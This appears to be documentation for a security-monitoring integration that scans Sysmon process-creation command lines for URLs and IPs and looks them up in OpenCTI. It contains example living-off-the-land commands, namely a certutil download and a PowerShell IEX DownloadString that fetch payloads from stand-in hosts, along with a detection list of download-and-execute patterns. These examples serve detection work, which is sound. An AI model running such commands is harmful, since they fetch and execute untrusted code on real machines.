# Command‑Line IoC Extraction (Sysmon EID 1)

This is one of the signature features of this fork. Beyond checking a process's
**hash**, Sysmon Event 1 alerts are scanned for **IP addresses and URLs embedded
in the command line**, which are then looked up in OpenCTI alongside the hash.

## Why it matters

A lot of malicious activity uses **trusted binaries** to do the dirty work — the
classic "living off the land" (LOLBin) pattern. The executable is legitimate
(`certutil.exe`, `powershell.exe`, `curl.exe`), so its hash is clean. The
malicious indicator is the **URL or IP in the arguments**:

```text
certutil.exe -urlcache -f http://malicious.example/payload.exe payload.exe
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')"
ping.exe 185.220.101.5
```

Checking only the hash would miss all of these. Extracting the URL/IP catches them.

## What the script extracts

From `win.eventdata.commandLine` the script pulls:

- **Public IPv4 addresses** — validated with `ipaddress`; private, loopback,
  link‑local and multicast are discarded.
- **Public IPv6 addresses** — same validation.
- **URLs** — anything starting with `http://` or `https://`.

```python
cmdline_url_regex  = re.compile(r'https?://[^\s\'"`,;>)\]]+')
cmdline_ipv4_regex = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
cmdline_ipv6_regex = re.compile(r'(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}|::(?:[0-9a-fA-F]{1,4}:){0,5}[0-9a-fA-F]{1,4}')
```

Each value becomes a STIX pattern (`[url:value = '…']`, `[ipv4-addr:value =
'…']`, `[ipv6-addr:value = '…']`).

## How it queries both hash and command‑line IoCs

If the Event 1 alert has **both** a SHA‑256 hash and command‑line IoCs, the
script issues a **single** GraphQL request that matches either key, using
`filterGroups`:

```python
obs_filter_groups = [
    {"mode": "or", "filterGroups": [],
     "filters": [{"key": "hashes.SHA-256", "values": filter_values}]},
    {"mode": "or", "filterGroups": [],
     "filters": [{"key": "value", "values": cmdline_values}]},
]
```

If there is **no** valid hash but command‑line IoCs are present, it falls back to
querying by `value` alone. If neither is present, it exits quietly.

## Capturing the right Event 1s

For this to work, Sysmon must actually emit Event 1 for the processes that carry
these command lines. The provided Sysmon config has an **include** block targeting
exactly the tools an attacker would use as a loader, plus `ping.exe` to capture
destination IPs:

```xml
<RuleGroup name="url_in_cmdline" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="end with">\PING.EXE</Image>
    <CommandLine condition="contains">curl http</CommandLine>
    <CommandLine condition="contains">Invoke-WebRequest</CommandLine>
    <CommandLine condition="contains">DownloadString</CommandLine>
    <CommandLine condition="contains">certutil -urlcache</CommandLine>
    <CommandLine condition="contains">bitsadmin /transfer</CommandLine>
    <CommandLine condition="contains">mshta http</CommandLine>
    <CommandLine condition="contains">regsvr32 /i:http</CommandLine>
    <CommandLine condition="contains">IEX</CommandLine>
    <!-- … and more LOLBin download/exec patterns … -->
  </ProcessCreate>
</RuleGroup>
```

## The companion rule

A small Manager rule promotes Event 1s whose command line contains a URL so the
integration treats them like the Linux `audit_command` path:

```xml
<group name="sysmon,sysmon_eid1_detections,audit_command,windows,">
  <rule id="100144" level="5">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.commandLine" type="pcre2">https?://</field>
    <description>Sysmon - URL Detected In CommandLine: $(win.eventdata.commandLine)</description>
    <mitre><id>T1105</id></mitre>
  </rule>
</group>
```

!!! note "Relationship to the Linux `audit_command` path"
    On Linux the script extracts URLs from audited `execve` arguments
    (`audit_command` group). On Windows this feature provides the equivalent
    capability from Sysmon Event 1 command lines, and additionally extracts IPs,
    not just URLs.
